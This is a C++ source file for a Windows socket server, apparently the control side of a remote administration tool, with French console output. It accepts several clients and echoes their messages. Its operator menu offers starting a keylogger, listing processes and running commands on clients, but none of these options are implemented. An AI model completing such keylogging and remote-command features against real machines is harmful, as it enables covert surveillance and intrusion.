#include "../utils/EnvLoader.h"
#include "../utils/LPTF_Socket.h"
#include "../utils/LPTF_Packet.h"
#include <vector>
#include <iostream>
#include <windows.h>

using namespace std;

bool isClientConnected = false;

int main() {
    SetConsoleOutputCP(CP_UTF8);
    SetConsoleCP(CP_UTF8);

    cout << "Serveur démarrage..." << endl;

    try {
        LPTF_Socket::initialize();

        LPTF_Socket serveur;
        auto env = EnvLoader::loadEnv("../../.env");
        int port = EnvLoader::loadPort("../../.env");
        serveur.bindSocket(port);
        serveur.listenSocket();

        vector<unique_ptr<LPTF_Socket>> clients;

        cout << "Serveur prêt. En attente de connexions..." << endl;

        while (true) {
            fd_set readfds;
            FD_ZERO(&readfds);

            int maxFd = serveur.getSocketFd();
            FD_SET(serveur.getSocketFd(), &readfds);

            for (const auto& client : clients) {
                int fd = client->getSocketFd();
                FD_SET(fd, &readfds);
                if (fd > maxFd) maxFd = fd;
            }

            // Wait for activity on sockets
            int activity = select(maxFd + 1, &readfds, nullptr, nullptr, nullptr);
            if (activity < 0) {
                cerr << "Erreur lors de select()" << endl;
                break;
            }

            if (FD_ISSET(serveur.getSocketFd(), &readfds)) {
                auto newClient = serveur.acceptSocket();
                cout << "Nouveau client : " << newClient->getClientIP() << endl;
                clients.push_back(move(newClient));
                isClientConnected = true;
            }

            for (auto it = clients.begin(); it != clients.end(); ) {
                int fd = (*it)->getSocketFd();
                if (FD_ISSET(fd, &readfds)) {
                    try {
                        std::vector<uint8_t> data = (*it)->recvBinary();
                        auto packet = LPTF_Packet::deserialize(data);

                        if (packet.getType() == LPTF_Packet::GET_INFO) {
                            std::string payload(packet.getPayload().begin(), packet.getPayload().end());
                            std::cout << "Message client : " << payload << std::endl;

                            std::string response = "Reçu : " + payload;
                            std::vector<uint8_t> responsePayload(response.begin(), response.end());

                            LPTF_Packet responsePacket(1, LPTF_Packet::RESPONSE, responsePayload);
                            (*it)->sendBinary(responsePacket.serialize());
                        }
                        ++it;
                    } catch (const std::exception& e) {
                        std::cerr << "Client déconnecté ou erreur : " << e.what() << std::endl;
                        it = clients.erase(it);
                    }
                } else {
                    ++it;
                }
            }

            if (isClientConnected) {
                cout << "-------------------------------------" << endl;
                cout << "Nombre de clients connectés : " << clients.size() << endl;
                cout << "1 - Afficher la liste des clients" << endl;
                cout << "2 - Envoyer un message au client" << endl;
                cout << "3 - Afficher les informations du client" << endl;
                cout << "4 - Démarrer le keylogger" << endl;
                cout << "5 - Eteindre le keylogger" << endl;
                cout << "6 - Afficher la liste des processus" << endl;
                cout << "7 - Exécuter une commande" << endl;
                cout << "8 - Quitter" << endl;
                cout << "Choisissez une option : ";
                int choice;
                cin >> choice;
            }
        }

    } catch (const exception& e) {
        cerr << "Erreur fatale : " << e.what() << endl;
        return 1;
    }

    return 0;
}
